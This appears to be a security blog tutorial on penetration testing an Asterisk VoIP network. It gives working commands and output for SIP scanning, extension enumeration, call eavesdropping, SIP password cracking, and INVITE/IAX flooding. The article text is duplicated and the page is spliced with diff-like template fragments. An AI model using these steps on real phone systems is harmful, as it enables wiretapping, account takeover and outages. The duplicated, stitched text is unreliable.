overview of VoIP </p>  <p>What is Asterisk? (and what are the functionalities) </p>  <p>What is Trixbox? </p>  <p>VoIP hacking (Penetration testing on an asterisk based network)</p>  <p>With so many aforementioned advantages, VoIP is gaining popularity among both organizations and private users alike. But what about the security issues? As should be entirely predictable, any new technology immediately presents opportunities for those seeking to cause mischief. This is confirmed by reports I’m sure you’ve heard about: not just the phone hacking scandal in Britain, but the hacking in which thieves easily steal confidential information from a victim because their network was not secure.</p>  <p>If you are a pen tester or ethical hacker, then you have an idea about the importance of penetration testing in VoIP, because most of the important communications going on today occur on VoIP and securing confidential information is therefore critical. We will do some practical penetration testing on a VoIP-based network, but first of all I will show you how to build it.</p>  <p>Asterisk is an open-source software that can turn your computer into a communications server. There’s an asterisk software for PBX (private branch exchange) that allows you to make calls and transfer your data.</p>  <p>Trixbox is a wonderful software (or PBX: private branch exchange), based on the asterisk project. It was formally known as but in October 2006 it was renamed Trixbox. The difference between trixbox with other PBX is that trixbox is based on IP (Internet protocol) and has been designed for small and medium sized businesses. There are mainly two version of trixbox available: one is Trixbox CE (a free and open source), while the other – called Trixbox Pro – is one that you will need to purchase.</p>  <p>Protocols &amp; Ports</p>  <p>You must have an idea about the protocols and their ports before attempting to launch actual penetration testing on a VoIP network.</p>  <p>SIP (or session initiation protocol) has been defined by Internet Engineering Task Force (IETF) as the protocol for VoIP communication (in other words: a signaling protocol). SIP uses port 5060 and 5061 for both TCP and UDP.</p>  <p>SDP or session description protocol is for multimedia communications, while MGCP (media gateway control protocol) uses port number 2427 and 2727 for UDP.</p>  <p>RTP (real-time transfer protocol) defines the packets to deliver videos and audios on IP based network like VoIP. RTCP (RTP control protocol) is just like RTP, and it is used to structure the packets that are defined by RTP.</p>  <p>IAX (Inter-Asterisk eXchange) is an important protocol used in the asterisk system and is supported by a different soft-phone and PBX. IAX2 is the second version of IAX and works on the UDP port number 4569.</p>  <p>VoIP Penetration Testing</p>  <p>The process of penetration testing on a VoIP network is generally the same as the penetration testing on any other network. All we need to do is to follow the general guidelines, starting with information gathering, as we would with any form of penetration testing. We will do the same on VoIP network.</p><a id="more"></a><p></p>  <p>Let’s consider a simple scenario: you have found an asterisk-based PBX while doing a penetration test on a network, like the nmap result showing below:</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[6]" border="0" alt="clip_image002[6]" src="http://img.cker.in/VoIP_227F/clip_image0026.jpg" width="586" height="331"></p>  <p>It might be some sort of VoIP server, so a smart penetration tester would use the available tools to learn more about this server. Therefore, in this section I will discuss some of the tools and their usage that will be really helpful in VoIP penetration testing.</p>  <p>SMAP</p>  <p>SMAP is a wonderful scanner that has the ability to detect SIP-enabled devices (it can find a single IP or a range of IPs, to all the subnets) and can locate any VoIP server within an operating system. So it will help to understand the VoIP network.</p>  <p>root@bt:/pentest/voip/smap# ./smap 192.168.1.9</p>  <p>smap 0.6.0 &lt;hs@123.org&gt; <a href="http://www.wormulon.net/" target="_blank" rel="external">http://www.wormulon.net/</a></p>  <p></p>  <p>192.168.1.9: ICMP reachable, SIP enabled</p>  <p>1 host scanned, 1 ICMP reachable, 1 SIP enabled (100.0%)</p>  <p>It shows that this host is a VoIP server. Let’s try to gather more information.</p>  <p>root@bt:/pentest/voip/smap# ./smap -O 192.168.1.9</p>  <p>smap 0.6.0 &lt;hs@123.org&gt; <a href="http://www.wormulon.net/" target="_blank" rel="external">http://www.wormulon.net/</a></p>  <p>192.168.1.9: ICMP reachable, SIP enabled</p>  <p>best guess (55% sure) fingerprint:</p>  <p>Asterisk PBX (unknown version)</p>  <p>User-Agent: Asterisk PBX 1.6.0.26-FONCORE-r78</p>  <p>1 host scanned, 1 ICMP reachable, 1 SIP enabled (100.0%)</p>  <p>-l: fingerprint learning mode</p>  <p>. It is a wonderful argument that will give us more information.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[8]" border="0" alt="clip_image002[8]" src="http://img.cker.in/VoIP_227F/clip_image0028.jpg" width="506" height="294"></p>  <p>SIP-Scan</p>  <p>It is just like the SMAP, in that an SIP-scan is also used to detect SIP-enabled devices. Likewise, it has the ability to scan over the entire range of IPs.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[6]" border="0" alt="clip_image004[6]" src="http://img.cker.in/VoIP_227F/clip_image0046.jpg" width="669" height="266"></p>  <p></p>  <p>root@bt:/pentest/voip/sipscan# ./sip-scan -i eth0 192.168.1.1-254</p>  <p>192.168.1.9: Asterisk PBX 1.6.0.26-FONCORE-r78</p>  <p>root@bt:/pentest/voip/sipscan#</p>  <p>SIPvicious</p>  <p>SIPvicious is a collection of multiple tools (or a tool suite) containing several wonderful implements for VoIP penetration testing purposes. We will discuss the most important – and their usage – in this section.</p>  <p>Svmap</p>  <p>This is a part of the SIPvicious suite. Svmap is a SIP scanner that can scan for SIP-enabled devices within a network. An example to find a VoIP server in a network is shown below.</p>  <p>root@bt:/pentest/voip/sipvicious# ./svmap.py 192.168.1.1/24</p>  <p>| SIP Device | User Agent | Fingerprint |</p>  <p>————————————————————————————————-</p>  <p>| 192.168.1.9:5060 | Asterisk PBX 1.6.0.26-FONCORE-r78 | Asterisk / SJphone/1.60.289a (SJ Labs) |</p>  <p>root@bt:/pentest/voip/sipvicious#</p>  <p>Extensions Enumeration</p>  <p>Extensions are the devices (may be a phone or desktop computer) that can make calls. Simple extensions are at the end node and connected with the VoIP server to transfer the data. So we need to locate the numbers used to transfer data in order to enumerate on the network further.</p>  <p><a name="Svwar"></a>Svwar</p>  <p>Svwar is part of the SIPvicious tool suite. It’s used to detect the end user (extensions) on a PBX.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[10]" border="0" alt="clip_image002[10]" src="http://img.cker.in/VoIP_227F/clip_image00210.jpg" width="669" height="125"></p>  <p>root@bt:/pentest/voip/sipvicious# ./svwar.py -e100-700 192.168.1.9</p>  <p>| Extension | Authentication |</p>  <p>——————————</p>  <p>| 500 | reqauth |</p>  <p>| 600 | reqauth |</p>  <p>Here -e100-700 defines the possible range of extensions.</p>  <p>Now, after doing just a little work, we have a lot of information about this VoIP network. We can now easily develop the network topology (these documents are included in the final report).</p>  <p>Here is the network diagram that I have created, based on the information that we have gathered in the above steps.</p>  <p></p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[12]" border="0" alt="clip_image002[12]" src="http://img.cker.in/VoIP_227F/clip_image00212.jpg" width="669" height="303"></p>  <p>Sniffing on VoIP Network</p>  <p>The concept of sniffing in VoIP network is the same as a general network sniffing concept. I will use some of the most famous tools to demonstrate the sniffing attack on VoIP network. Let us start with Wireshark, which is able to capture VoIP traffic.</p>  <p>Now let’s suppose the end users (extensions) are busy communicating with each other, and that an attacker is trying to capture some traffic so that he/she will able to get the data (their communication).</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[8]" border="0" alt="clip_image004[8]" src="http://img.cker.in/VoIP_227F/clip_image0048.jpg" width="669" height="198"></p>  <p>Wireshark has captured some traffic. As discussed above on the protocol section, RTP contains the information. The question now is: how do we extract information from these packets? Wireshark provides the option to extract the information with a built-in feature for VoIP. Click on the telephony tab – VoIP calls you. You will then get this window:</p>  <p></p>  <p>VoIP or voice over IP (Internet protocol) is a transmission mode designed for use in voice and multimedia communications. As IP (Internet protocol)-based networks like the Internet seem to be most successful communications infrastructure, the traditional telephone network is currently being replaced VoIP. Nowadays, its clear improvements and advantages over the old systems make it a popular substitute, with a number of advantages. Among them:</p>  <p>The low cost of VoIP as compared to a traditional telephone network. There are any number of services available free of cost (like Skype) that allow you to communicate over distances long or short, PC-to-PC and free of cost.</p>  <p>VoIP is portable. Portability and mobility is another advantage of VoIP over traditional telephone; you only need an Internet connection for communication.</p>  <p>VoIP service includes a number of different advanced features not normally available with traditional telephone service, including call forwarding, conference call, caller ID, virtual numbers and more.</p>  <p>The advantages are many but this is not our main topic of discussion. (Likewise, there are a number of disadvantages, too: VoIP services depend on Internet connection speed; voice quality depends on the performance of your computer, and so forth). So what is our point in discussing this? What we examine here will be the security aspect of VoIP. In this article, we will review:</p>  <p>An overview of VoIP </p>  <p>What is Asterisk? (and what are the functionalities) </p>  <p>What is Trixbox? </p>  <p>VoIP hacking (Penetration testing on an asterisk based network)</p>  <p>With so many aforementioned advantages, VoIP is gaining popularity among both organizations and private users alike. But what about the security issues? As should be entirely predictable, any new technology immediately presents opportunities for those seeking to cause mischief. This is confirmed by reports I’m sure you’ve heard about: not just the phone hacking scandal in Britain, but the hacking in which thieves easily steal confidential information from a victim because their network was not secure.</p>  <p>If you are a pen tester or ethical hacker, then you have an idea about the importance of penetration testing in VoIP, because most of the important communications going on today occur on VoIP and securing confidential information is therefore critical. We will do some practical penetration testing on a VoIP-based network, but first of all I will show you how to build it.</p>  <p>Asterisk is an open-source software that can turn your computer into a communications server. There’s an asterisk software for PBX (private branch exchange) that allows you to make calls and transfer your data.</p>  <p>Trixbox is a wonderful software (or PBX: private branch exchange), based on the asterisk project. It was formally known as but in October 2006 it was renamed Trixbox. The difference between trixbox with other PBX is that trixbox is based on IP (Internet protocol) and has been designed for small and medium sized businesses. There are mainly two version of trixbox available: one is Trixbox CE (a free and open source), while the other – called Trixbox Pro – is one that you will need to purchase.</p>  <p>Protocols &amp; Ports</p>  <p>You must have an idea about the protocols and their ports before attempting to launch actual penetration testing on a VoIP network.</p>  <p>SIP (or session initiation protocol) has been defined by Internet Engineering Task Force (IETF) as the protocol for VoIP communication (in other words: a signaling protocol). SIP uses port 5060 and 5061 for both TCP and UDP.</p>  <p>SDP or session description protocol is for multimedia communications, while MGCP (media gateway control protocol) uses port number 2427 and 2727 for UDP.</p>  <p>RTP (real-time transfer protocol) defines the packets to deliver videos and audios on IP based network like VoIP. RTCP (RTP control protocol) is just like RTP, and it is used to structure the packets that are defined by RTP.</p>  <p>IAX (Inter-Asterisk eXchange) is an important protocol used in the asterisk system and is supported by a different soft-phone and PBX. IAX2 is the second version of IAX and works on the UDP port number 4569.</p>  <p>VoIP Penetration Testing</p>  <p>The process of penetration testing on a VoIP network is generally the same as the penetration testing on any other network. All we need to do is to follow the general guidelines, starting with information gathering, as we would with any form of penetration testing. We will do the same on VoIP network.</p>  <p>Let’s consider a simple scenario: you have found an asterisk-based PBX while doing a penetration test on a network, like the nmap result showing below:</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[14]" border="0" alt="clip_image002[14]" src="http://img.cker.in/VoIP_227F/clip_image00214.jpg" width="586" height="331"></p>  <p>It might be some sort of VoIP server, so a smart penetration tester would use the available tools to learn more about this server. Therefore, in this section I will discuss some of the tools and their usage that will be really helpful in VoIP penetration testing.</p>  <p>SMAP</p>  <p>SMAP is a wonderful scanner that has the ability to detect SIP-enabled devices (it can find a single IP or a range of IPs, to all the subnets) and can locate any VoIP server within an operating system. So it will help to understand the VoIP network.</p>  <p>root@bt:/pentest/voip/smap# ./smap 192.168.1.9</p>  <p>smap 0.6.0 &lt;hs@123.org&gt; <a href="http://www.wormulon.net/" target="_blank" rel="external">http://www.wormulon.net/</a></p>  <p>192.168.1.9: ICMP reachable, SIP enabled</p>  <p>1 host scanned, 1 ICMP reachable, 1 SIP enabled (100.0%)</p>  <p>It shows that this host is a VoIP server. Let’s try to gather more information.</p>  <p>root@bt:/pentest/voip/smap# ./smap -O 192.168.1.9</p>  <p>smap 0.6.0 &lt;hs@123.org&gt; <a href="http://www.wormulon.net/" target="_blank" rel="external">http://www.wormulon.net/</a></p>  <p>192.168.1.9: ICMP reachable, SIP enabled</p>  <p>best guess (55% sure) fingerprint:</p>  <p>Asterisk PBX (unknown version)</p>  <p>User-Agent: Asterisk PBX 1.6.0.26-FONCORE-r78</p>  <p>1 host scanned, 1 ICMP reachable, 1 SIP enabled (100.0%)</p>  <p>-l: fingerprint learning mode</p>  <p>. It is a wonderful argument that will give us more information.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[10]" border="0" alt="clip_image004[10]" src="http://img.cker.in/VoIP_227F/clip_image00410.jpg" width="506" height="294"></p>  <p>SIP-Scan</p>  <p>It is just like the SMAP, in that an SIP-scan is also used to detect SIP-enabled devices. Likewise, it has the ability to scan over the entire range of IPs.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006[6]" border="0" alt="clip_image006[6]" src="http://img.cker.in/VoIP_227F/clip_image0066.jpg" width="669" height="266"></p>  <p>root@bt:/pentest/voip/sipscan# ./sip-scan -i eth0 192.168.1.1-254</p>  <p>192.168.1.9: Asterisk PBX 1.6.0.26-FONCORE-r78</p>  <p>root@bt:/pentest/voip/sipscan#</p>  <p>SIPvicious</p>  <p>SIPvicious is a collection of multiple tools (or a tool suite) containing several wonderful implements for VoIP penetration testing purposes. We will discuss the most important – and their usage – in this section.</p>  <p>Svmap</p>  <p>This is a part of the SIPvicious suite. Svmap is a SIP scanner that can scan for SIP-enabled devices within a network. An example to find a VoIP server in a network is shown below.</p>  <p>root@bt:/pentest/voip/sipvicious# ./svmap.py 192.168.1.1/24</p>  <p>| SIP Device | User Agent | Fingerprint |</p>  <p>————————————————————————————————-</p>  <p>| 192.168.1.9:5060 | Asterisk PBX 1.6.0.26-FONCORE-r78 | Asterisk / SJphone/1.60.289a (SJ Labs) |</p>  <p>root@bt:/pentest/voip/sipvicious#</p>  <p>Extensions Enumeration</p>  <p>Extensions are the devices (may be a phone or desktop computer) that can make calls. Simple extensions are at the end node and connected with the VoIP server to transfer the data. So we need to locate the numbers used to transfer data in order to enumerate on the network further.</p>  <p><a name="Svwar"></a>Svwar</p>  <p>Svwar is part of the SIPvicious tool suite. It’s used to detect the end user (extensions) on a PBX.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008[6]" border="0" alt="clip_image008[6]" src="http://img.cker.in/VoIP_227F/clip_image0086.jpg" width="669" height="125"></p>  <p>root@bt:/pentest/voip/sipvicious# ./svwar.py -e100-700 192.168.1.9</p>  <p>| Extension | Authentication |</p>  <p>——————————</p>  <p>| 500 | reqauth |</p>  <p>| 600 | reqauth |</p>  <p>Here -e100-700 defines the possible range of extensions.</p>  <p>Now, after doing just a little work, we have a lot of information about this VoIP network. We can now easily develop the network topology (these documents are included in the final report).</p>  <p>Here is the network diagram that I have created, based on the information that we have gathered in the above steps.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010[6]" border="0" alt="clip_image010[6]" src="http://img.cker.in/VoIP_227F/clip_image0106.jpg" width="669" height="303"></p>  <p>Sniffing on VoIP Network</p>  <p>The concept of sniffing in VoIP network is the same as a general network sniffing concept. I will use some of the most famous tools to demonstrate the sniffing attack on VoIP network. Let us start with Wireshark, which is able to capture VoIP traffic.</p>  <p>Now let’s suppose the end users (extensions) are busy communicating with each other, and that an attacker is trying to capture some traffic so that he/she will able to get the data (their communication).</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012[6]" border="0" alt="clip_image012[6]" src="http://img.cker.in/VoIP_227F/clip_image0126.jpg" width="669" height="198"></p>  <p>Wireshark has captured some traffic. As discussed above on the protocol section, RTP contains the information. The question now is: how do we extract information from these packets? Wireshark provides the option to extract the information with a built-in feature for VoIP. Click on the telephony tab – VoIP calls you. You will then get this window:</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image014[6]" border="0" alt="clip_image014[6]" src="http://img.cker.in/VoIP_227F/clip_image0146.jpg" width="669" height="254"></p>  <p>Click on the player, then on the decode tab. You are now able to listen in to this communication and all of the data available in the audio file.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image016[6]" border="0" alt="clip_image016[6]" src="http://img.cker.in/VoIP_227F/clip_image0166.jpg" width="669" height="354"></p>  <p>SIP Authentication Cracking (VoIP Cracking)</p>  <p>The importance of password is not a hidden truth, so in this section I will show you how to crack the password of any extension (user) on VoIP network. This attack is the most dangerous, because if an attacker know your password, then he/she will be able to authenticate on the network by using your identity.</p>  <p>The Wireshark result can be used for authentication cracking. Save the result into name.pcap; we will now use a wonderful tool called SIPcrack. It contains two scripts: one, sipdump, which will allow you to dump the authentication data into hashes; the second, sipcrack, which will help you to crack the VoIP password.</p>  <p>root@bt:~/Desktop/SIPcrack# ./sipdump pass.txt -p aa.pcap</p>  <p>SIPdump 0.3pre ( MaJoMu | www.codito.de )</p>  <p>—————————————</p>  <p><em> Using pcap file ‘aa.pcap’ for sniffing</em></p>  <p> Starting to sniff with packet filter ‘tcp or udp’</p>  <p><em> Dumped login from 192.168.1.9 -&gt; 192.168.1.3 (User: ‘600’)</em></p>  <p>Exiting, sniffed 1 logins</p>  <p>Sipcrack needs a wordlist to launch an attack. As a result, it will give you the password.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image018[6]" border="0" alt="clip_image018[6]" src="http://img.cker.in/VoIP_227F/clip_image0186.jpg" width="669" height="370"></p>  <p>Another wonderful tool that will help you to crack the SIP password is svcrack. As with the others, it can be find under the tool suite of sipvicious. Svcrack is wonderful for brute force attacks on SIP accounts.</p>  <p>root@bt:/pentest/voip/sipvicious# ./svcrack.py -u600 -d list.txt 192.168.1.9</p>  <p>| Extension | Password |</p>  <p>————————</p>  <p>| 600 | 12345 |</p>  <p>Denial of Service Attack on VoIP Network</p>  <p>Denial of server (DOS) attack is a dangerous attack that can cause the VoIP network and devices to crash. Inviteflood is the tool used to launch DOS attacks against any extensions (user) on the VoIP network. Usage:   <table border="0" cellpadding="0"><tbody>       <tr>         <td>           <p>1</p>         </td>          <td>           <p>./inviteflood interface targetuser targetdomain floodtarget numberofpackets</p>         </td>       </tr>        <tr>         <td>           <p>2</p>         </td>          <td>           <p>./inviteflood eth0 600 192.168.1.3 192.168.1.3 200000</p>         </td>       </tr>     </tbody></table> </p>  <p>It seems to be a “ping of death” attack and it will crash the end user operating system, disabling the ability of he/she to make any calls.</p>  <p>Iaxflood is another a good tool that can flood the IAX2 protocol; the usage is very simple:</p>  <p>root@bt:/pentest/voip/iaxflood# ./iaxflood</p>  <p>usage: ./iaxflood sourcename destinationname numpackets</p>  <p>A simple usage like:</p>  <p>root@bt:/pentest/voip/iaxflood# ./iaxflood 192.168.1.13 192.168.1.2 10000</p>  <p>Will flood port 4569 from port 4569 10000 times</p>  <p>We have IP_HDRINCL</p>  <p>Number of Packets sent:</p>  <p>Sent 10000</p>  <p>root@bt:/pentest/voip/iaxflood#</p>  <p>Metasploit on VoIP Penetration Testing</p>  <p>Metasploit has a different auxiliary module for VoIP network. Here is the list of some best auxiliary modules of metasploit for VoIP hacking:</p>  <p>auxiliary/scanner/sip/options (To find the SIP enable devices)</p>  <p>auxiliary/scanner/sip/enumerator (To enumerate the extensions)</p>  <p>We can do basic VoIP network penetration testing by using metasploit auxiliary modules for information gathering and enumeration. We can scan an entire network to find the SIP enable devices, plus metasploit auxiliary modules are fast.</p>  <p>msf &gt; use auxiliary/scanner/sip/options</p>  <p>msf auxiliary(options) &gt; set RHOSTS 192.168.1.1/24</p>  <p>RHOSTS =&gt; 192.168.1.1/24</p>  <p>msf auxiliary(options) &gt; run</p>  <p>[] 192.168.1.3 sip:nobody@192.168.1.3 agent=’WAcjCpW’</p>  <p>[<em>] 192.168.1.9 200 agent=’Asterisk PBX 1.6.0.26-FONCORE-r78’ verbs=’INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY, INFO’</em></p>  <p>[] 192.168.1.9 200 agent=’Asterisk PBX 1.6.0.26-FONCORE-r78’ verbs=’INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY, INFO’</p>  <p>[<em>] Scanned 256 of 256 hosts (100% complete)</em></p>  <p>[] Auxiliary module execution completed</p>  <p>msf auxiliary(options) &gt;</p>  <p>VoIP Phishing</p>  <p>Security awareness is very important. Before concluding this article, I just want to briefly discuss VoIP phishing. Phishing is not a new attack – it is pretty old school – but it remains a threat because hackers usually use some social engineering technique to trick a user before stealing his/her credential information. You might have heard about email phishing, in which an attacker directs the victim to a fake page, so that they will enter their confidential information. In the same fashion, a hacker can hijack your calls to get your credential information.</p>  <p>Let’s suppose someone received a call or email like this:</p>  <p>“Hi, this is an urgent email (call) that has been generated by the network administrator. We have found something wrong with your account, so please call back at XXXX-XXXX-XXX to verify your account.” “</p>  <p>Typically, an unwary user will call back; the hacker may then ask for some confidential information. You need to understand the risk; educate people around you.</p>
-    </section>
-    <footer class="post-footer">
-      <section class="author">
-    <h4>Secer</h4>
-    <p>记录互联网安全历程与个人成长经历</p>
-</section>
-      <section class="share">
-    <h4>Share this post</h4>
-    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/507.seo/" target="_blank">
-        <span class="hidden">weibo</span>
-    </a>
-    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/507.seo/"
-       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-        <span class="hidden">Twitter</span>
-    </a>
-    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/507.seo/"
-       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
-        <span class="hidden">Facebook</span>
-    </a>
-    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/507.seo/"
-       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
-        <span class="hidden">Google+</span>
-    </a>
-</section>
-
-    </footer>
-  </article>
-  <nav class="pagination" role="pagination">
-    
-    <a class="newer-posts" href="/510.seo/">
-        ← 两个变形的一句话php马
-    </a>
-    
-    <span class="icon-logo">•</span>
-    
-    <a class="older-posts" href="/504.seo/">
-        2个星期艰难的渗透纪实 →
-    </a>
-    
-</nav>
-
-  <div id="comment" class="comments-area">
-    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
-    
-</div>
-
-</main>
-
-
-      
-<footer class="site-footer">
   
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
-  </div>
-</footer>
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+    <span class="jiathis_txt">分享到：</span>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_weixin"></a>
+    <a class="jiathis_button_renren"></a>
+    <a href="http://www.jiathis.com/share?uid=1987046" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+    <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1987046" charset="utf-8"></script>
+<!-- JiaThis Button END -->
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
-
-
-
-  </div>
 </div>
 
-<nav  class="outer-nav top horizontal">
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/category/渗透测试/">渗透测试</a>
+</div>
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+  <div class="article-tags">
+  
+  <span></span> <a href="/tag/渗透/">渗透</a><a href="/tag/backtrack/">backtrack</a><a href="/tag/VoIP渗透测试/">VoIP渗透测试</a><a href="/tag/渗透测试/">渗透测试</a>
+  </div>
 
-          <a class="icon-image"  href="/images"><span>Images</span></a>
 
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/510.seo/" title="两个变形的一句话php马">
+  <strong>Prev:</strong><br/>
+  <span>
+  两个变形的一句话php马</span>
+</a>
+</div>
 
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
 
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+<div class="next">
+<a href="/504.seo/"  title="2个星期艰难的渗透纪实">
+ <strong>Next:</strong><br/> 
+ <span>2个星期艰难的渗透纪实
+</span>
+</a>
+</div>
 
 </nav>
 
+	<!-- 多说-->
+
+<section class="comment">
+<div class="ds-thread" data-thread-key="post-VoIP渗透测试" data-title="VoIP渗透测试" data-url="http://ha.cker.in/507.seo/"></div>
+</section>
+<!-- disqus-->
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  <p class="asidetitle">关注</p>
+<iframe width="100%" height="120" class="share_self" marginheight="5px" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=120&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=2583230784&verifier=1d07a1a0&dpc=1"></iframe>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/category/Linux笔记/" title="Linux笔记">Linux笔记<sup>46</sup></a></li>
+		
+			<li><a href="/category/Web安全/" title="Web安全">Web安全<sup>88</sup></a></li>
+		
+			<li><a href="/category/代码学习/" title="代码学习">代码学习<sup>25</sup></a></li>
+		
+			<li><a href="/category/原创文章/" title="原创文章">原创文章<sup>37</sup></a></li>
+		
+			<li><a href="/category/工具视频/" title="工具视频">工具视频<sup>12</sup></a></li>
+		
+			<li><a href="/category/影音娱乐/" title="影音娱乐">影音娱乐<sup>15</sup></a></li>
+		
+			<li><a href="/category/手机安全/" title="手机安全">手机安全<sup>11</sup></a></li>
+		
+			<li><a href="/category/无线安全/" title="无线安全">无线安全<sup>4</sup></a></li>
+		
+			<li><a href="/category/渗透测试/" title="渗透测试">渗透测试<sup>94</sup></a></li>
+		
+			<li><a href="/category/疑难杂症/" title="疑难杂症">疑难杂症<sup>11</sup></a></li>
+		
+			<li><a href="/category/精品软件/" title="精品软件">精品软件<sup>16</sup></a></li>
+		
+			<li><a href="/category/絮叨碎语/" title="絮叨碎语">絮叨碎语<sup>47</sup></a></li>
+		
+			<li><a href="/category/黑客技巧/" title="黑客技巧">黑客技巧<sup>77</sup></a></li>
+		
+		</ul>
 </div>
-</body>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tag/net/" title=".net">.net<sup>1</sup></a></li>
+		
+			<li><a href="/tag/0day/" title="0day">0day<sup>5</sup></a></li>
+		
+			<li><a href="/tag/12306/" title="12306">12306<sup>3</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂/" title="12306刷票外挂">12306刷票外挂<sup>1</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂下载/" title="12306刷票外挂下载">12306刷票外挂下载<sup>1</sup></a></li>
+		
+			<li><a href="/tag/1521/" title="1521">1521<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3389/" title="3389">3389<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360/" title="360">360<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3600safe/" title="3600safe">3600safe<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360浏览器抢票专版/" title="360浏览器抢票专版">360浏览器抢票专版<sup>1</sup></a></li>
+		
+			<li><a href="/tag/61398/" title="61398">61398<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ACL/" title="ACL">ACL<sup>1</sup></a></li>
+		
+			<li><a href="/tag/APT/" title="APT">APT<sup>3</sup></a></li>
+		
+			<li><a href="/tag/ARP/" title="ARP">ARP<sup>2</sup></a></li>
+		
+			<li><a href="/tag/ASP/" title="ASP">ASP<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ASP中FSO的神奇功能/" title="ASP中FSO的神奇功能">ASP中FSO的神奇功能<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ATM/" title="ATM">ATM<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript中shellcode的定位和提取/" title="ActionScript中shellcode的定位和提取">ActionScript中shellcode的定位和提取<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript的反汇编和反编译/" title="ActionScript的反汇编和反编译">ActionScript的反汇编和反编译<sup>1</sup></a></li>
+		
+			<li><a href="/tag/Acunetix-Web-Vulnerability-Scanner/" title="Acunetix Web Vulnerability Scanner">Acunetix Web Vulnerability Scanner<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+      <li><a href="http://blog.csdn.net/dreajay" target="_blank" title="dreajay csdn">CSDN</a></li>
+      <li><a href="https://github.com/dreajay" target="_blank" title="dreajay github">github</a></li>
+      <li><a href="http://www.douban.com/people/72514701/" target="_blank" title="dreajay豆瓣">豆瓣</a></li>
+    </ul>
+</div>
+
